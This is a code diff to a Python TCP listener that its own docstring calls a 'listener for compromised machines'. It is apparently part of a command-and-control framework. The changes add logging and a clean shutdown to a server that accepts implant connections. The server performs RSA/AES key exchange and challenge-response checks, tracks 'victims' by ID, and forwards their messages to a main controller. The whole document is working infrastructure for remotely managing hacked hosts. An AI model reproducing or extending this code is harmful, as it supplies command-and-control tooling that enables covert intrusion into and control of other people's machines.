@@ -1,3 +1,10 @@
+'''
+Description: TCP listener for compromised machines.
+Author: iss4cf0ng/ISSAC
+Acknowledgement:
+    - AES pure implementation: https://github.com/bozhu/AES-Python
+'''
+
 import socket
 import threading
 import json
@@ -7,7 +14,6 @@ from datetime import datetime
 
 from lib.C2P import C2P
 from lib.Client import Client
-from lib.ColorPrint import ColorPrint as cp
 from lib.EZCrypto import PAES, EZRSA, Encoder, PRSA
 from lib.Listener import Listener as mainListener
 from lib.tool import EZData, EZClass
@@ -31,6 +37,7 @@ class Listener:
         self.bListen = sock.fileno() != -1
 
         self.msg_handler = None
+        self.listening = False
 
         '''
         Dictionary format:
@@ -41,23 +48,34 @@ class Listener:
 
     def start(self):
         self.sock.listen(10000)
+        self.sock.settimeout(1)
+        self.listening = True
 
-        while True:
-            conn, addr = self.sock.accept()
+        while self.listening:
+            try:
+                conn, addr = self.sock.accept()
+            except socket.timeout:
+                continue
+            except OSError:
+                break # socket closed
 
-            cp.pf_info(f'New client: ({addr[0]},{addr[1]})')
+            self.log.info(f'New client: ({addr[0]},{addr[1]})')
 
             t = threading.Thread(target=self.handler, args=[conn, addr, ])
             t.daemon = True
 
             t.start()
+        
+        self.log.info('Listener thread exited.')
 
     def stop(self) -> bool:
         try:
+            self.listening = False
             self.sock.close()
+            self.log.info(f'Stopped')
             return True
         except Exception as ex:
-            cp.pf_err(ex)
+            self.log.error(str(ex))
             return False
 
     def combine_bytes(self, abFirst: bytes, nIdxFirst: int, nLenFirst: int, abSecond: bytes, nIdxSecond: int, nLenSecond: int) -> bytes:
@@ -70,9 +88,10 @@ class Listener:
         clnt = Client(clnt_sock)
         clnt.addr = clnt_addr
         clnt.type = 'TCP'
+        self.log.info(f'{clnt.addr}: Type=> {clnt.type}')
 
         try:
-            while clnt_sock.fileno() != -1:
+            while True:
                 abStaticRecv = clnt_sock.recv(C2P.BUFFER_MAX_LENGTH)
                 nRecvLength = len(abStaticRecv)
 
@@ -101,7 +120,7 @@ class Listener:
                         if nCmd == 0:
                             if nParam == 0:
                                 clnt.close()
-                                cp.pf_info('Socket is closed.', clnt.addr)
+                                self.log.info(f'{clnt.addr}: Socket is closed.')
                             elif nParam == 1:
                                 if clnt.dtLastLattency == None:
                                     clnt.dtLastLattency = datetime.now()
@@ -120,27 +139,27 @@ class Listener:
                                 t.start()
                         elif nCmd == 1:
                             if nParam == 0:
-                                cp.pf_ok('Server is notified to do key exchange.', clnt.addr)
+                                self.log.debug(f'{clnt.addr}: Server is notified to do key exchange')
 
                                 n_rsa_keysize = 4096
                                 n, e, d, p, q = EZRSA(n_rsa_keysize).generate_rsa_keypair(n_rsa_keysize)
                                 xml_PubKey = EZRSA(n_rsa_keysize).encode_public_key(n, e)
                                 xml_PrivKey = EZRSA(n_rsa_keysize).encode_private_key(n, e, d, p, q)
 
-                                cp.pf_ok('RSA key pair is generated.', clnt.addr)
+                                self.log.debug(f'{clnt.addr}: RSA key pair is generated.')
 
                                 clnt.xml_rsa_pubKey = xml_PubKey
                                 clnt.xml_rsa_privKey = xml_PrivKey
 
                                 clnt.send(1, 1, Encoder.stre2b64(xml_PubKey))
 
-                                cp.pf_ok('Sent RSA public key.', clnt.addr)
+                                self.log.debug(f'{clnt.addr}: Sent RSA public key.')
                             elif nParam == 2:
                                 szMsg = abMsg.decode('utf-8')
                                 split = Encoder.b64d2str(szMsg).split('|')
 
                                 if len(split) == 2:
-                                    cp.pf_info('Received encrypted AES key and initial vector', clnt.addr)
+                                    self.log.debug(f'{clnt.addr}: Received encrypted AES key and initial vector')
 
                                     sz_b64_enc_iv = split[0]
                                     sz_b64_enc_key = split[1]
@@ -155,31 +174,31 @@ class Listener:
 
                                     clnt.set_aes(PAES(ab_iv, ab_key))
                                     
-                                    cp.pf_ok('RSA Decrypt successfully, the server obtain both AES key and IV.', clnt.addr)
+                                    self.log.debug(f'{clnt.addr}: RSA Decrypt successfully, the server obtain both AES key and IV.')
 
                                     # Do challenge and response for vertification.
-                                    cp.pf_info('Do challenge and response for vertification...', clnt.addr)
+                                    self.log.debug(f'{clnt.addr}: Do challenge and response for vertification...')
 
                                     clnt.szChallenge = C2P.random_str(100)
                                     threading.Thread(target=lambda: clnt.send(1, 3, clnt.szChallenge)).start()
                                 else:
-                                    cp.pf_err('Invalid received abMsg.', clnt.addr)
-                                    cp.pf_info('Restart key exchange...', clnt.addr)
+                                    self.log.debug(f'{clnt.addr}: Invalid received abMsg.')
+                                    self.log.debug(f'{clnt.addr}: Restart key exchange...')
 
                                     clnt.send(1, 0, C2P.random_str())
                             elif nParam == 4:
-                                cp.pf_info('Trying vertification...', clnt.addr)
+                                self.log.debug(f'{clnt.addr}: Trying vertification...')
 
                                 szCipherResp = abMsg.decode('utf-8')
                                 ab_enc_resp = Encoder.b64str2bytes(szCipherResp)
                                 szPlainResp = clnt.pAES.decrypt_cbc(ab_enc_resp).decode('utf-8')
 
                                 if szPlainResp == clnt.szChallenge:
-                                    cp.pf_ok('Vertification successed.', clnt.addr)
+                                    self.log.info(f'{clnt.addr}: Vertification successed.')
 
                                     clnt.sendcipher(2, 0, C2P.random_str())
                                 else:
-                                    cp.pf_err('Vertification failed.', clnt.addr)
+                                    self.log.error(f'{clnt.addr}: Vertification failed.')
                         elif nCmd == 2: # Victim
                             try:
                                 cipher = Encoder.b64str2bytes(abMsg.decode('ascii'))
@@ -225,12 +244,14 @@ class Listener:
                                                 self.dic_victim.pop(clnt_addr)
                                                 clnt.VictimID = obj_json['ID']
 
-                                    self.msg_handler(self.main_listener, self, aMsg[0], clnt, aMsg[1:])
+                                    # message forwarding, pass message from victim to main listener.
+                                    if self.listening:
+                                        self.msg_handler(self.main_listener, self, aMsg[0], clnt, aMsg[1:])
 
                             except Exception as ex:
-                                print(ex)
+                                self.log.error(str(ex))
             
-            cp.pf_info(f'Victim offline: {clnt.VictimID}')
+            self.log.debug(f'Victim offline: {clnt.VictimID}')
 
             if clnt.VictimID in self.dic_victim.keys():
                 self.dic_victim.pop(clnt.VictimID)
@@ -241,7 +262,8 @@ class Listener:
         except Exception as ex:
             #raise ex
             self.dic_victim.pop(clnt.VictimID)
-            print(f'Template: {ex}')
+            self.log.error(str(ex))
+            raise ex
         
     def get_victims(self) -> dict:
         return self.dic_victim
